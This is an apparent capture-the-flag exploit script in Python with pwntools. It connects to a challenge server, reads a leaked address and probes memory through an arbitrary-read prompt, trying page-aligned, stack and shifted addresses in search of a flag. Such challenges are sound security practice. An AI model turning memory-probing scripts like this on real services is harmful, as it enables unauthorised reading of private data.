from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
base = int(m.group(1), 16)
print(f'Dict base: {hex(base)}')

def read8(addr):
    io.sendline(hex(addr).encode())
    line = io.recvline(timeout=3).decode().strip()
    if 'illegal memory address' in line:
        return None
    try:
        _, data = line.split(': ')
        return bytes.fromhex(data.strip())
    except:
        return None

print("\n=== Trying different strategies ===")

# Strategy 1: Maybe the base address IS readable but with page alignment
page_base = base & ~0xfff  # Align to 4K page
print(f"Trying page-aligned base: {page_base:#x}")

for offset in range(0, 0x1000, 8):
    addr = page_base + offset
    if addr > base + 0x200:  # Don't go too far past the original address
        break
    data = read8(addr)
    if data:
        val = u64(data)
        print(f'{addr:#x}: {data.hex()} -> {val:#x}')
        break

# Strategy 2: Maybe we need to try stack addresses instead of heap
# Try some common stack address patterns
stack_bases = [
    0x7ffe00000000,
    0x7fff00000000, 
    0x7ffd00000000,
    0x7ffc00000000,
]

print("\n=== Trying stack regions ===")
for stack_base in stack_bases:
    print(f"Trying stack base {stack_base:#x}")
    for offset in range(0, 0x100, 8):
        addr = stack_base + offset
        data = read8(addr)
        if data:
            chars = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in data)
            print(f'{addr:#x}: {chars}')
            if any(c in chars for c in 'KCSC{}'):
                print(f'  *** FOUND FLAG PATTERN: {chars}')
            break
    else:
        continue
    break

# Strategy 3: Try the exact address but interpret it differently 
# Maybe it's not a direct pointer but needs manipulation
print(f"\n=== Trying address manipulations ===")
variations = [
    base,
    base + 8,
    base + 16, 
    base + 24,
    base - 8,
    base - 16,
    base | 1,  # Set low bit
    base & ~7,  # Clear low bits
    base ^ 0x1000,  # XOR with page size
]

for addr in variations:
    data = read8(addr)
    if data:
        val = u64(data)
        chars = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in data)
        print(f'{addr:#x}: {chars} (val: {val:#x})')

io.close()